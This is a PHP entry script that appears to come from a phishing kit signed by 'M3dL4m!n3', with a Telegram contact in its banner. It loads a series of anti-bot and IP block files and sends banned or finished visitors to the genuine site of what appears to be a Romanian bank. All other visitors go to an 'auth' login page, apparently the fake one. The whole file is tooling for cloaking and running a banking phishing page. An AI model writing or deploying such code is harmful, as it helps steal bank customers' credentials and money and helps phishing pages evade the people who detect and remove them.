<?php

    /*
    ███╗   ███╗██████╗ ██████╗ ██╗██╗  ██╗███╗   ███╗██╗███╗   ██╗██████╗ 
    ████╗ ████║╚════██╗██╔══██╗██║██║  ██║████╗ ████║██║████╗  ██║╚════██╗
    ██╔████╔██║ █████╔╝██║  ██║██║███████║██╔████╔██║██║██╔██╗ ██║ █████╔╝
    ██║╚██╔╝██║ ╚═══██╗██║  ██║██║╚════██║██║╚██╔╝██║╚═╝██║╚██╗██║ ╚═══██╗
    ██║ ╚═╝ ██║██████╔╝██████╔╝███████╗██║██║ ╚═╝ ██║██╗██║ ╚████║██████╔╝
    ╚═╝     ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝ 
         c0ded By M3dL4m!n3  Contact Telegram: @M3dL4m1n3
    */
	
	include 'cagebot/anti1.php';
	include 'cagebot/anti2.php';
	include 'cagebot/anti3.php';
	include 'cagebot/anti4.php';
	include 'cagebot/anti5.php';
	include 'cagebot/anti6.php';
	include 'cagebot/anti7.php';
	include 'cagebot/anti8.php';
	include 'cagebot/anti9.php';
	include 'blocks.php';
	include 'vendor/random.php';
	include 'vendor/seen.php';
	include 'vendor/forbidden.php';

   $file = file_get_contents( "vendor/ban.txt" );
   if(@$_SESSION['Done'] == 1 || preg_match("#\b{$IPAdress}\b#", $file ) ) {
   die('<META HTTP-EQUIV="Refresh" Content="0; URL=https://www.mybrdnet.ro/">');
   exit();
   }

	header('Location: auth/index.php');

?>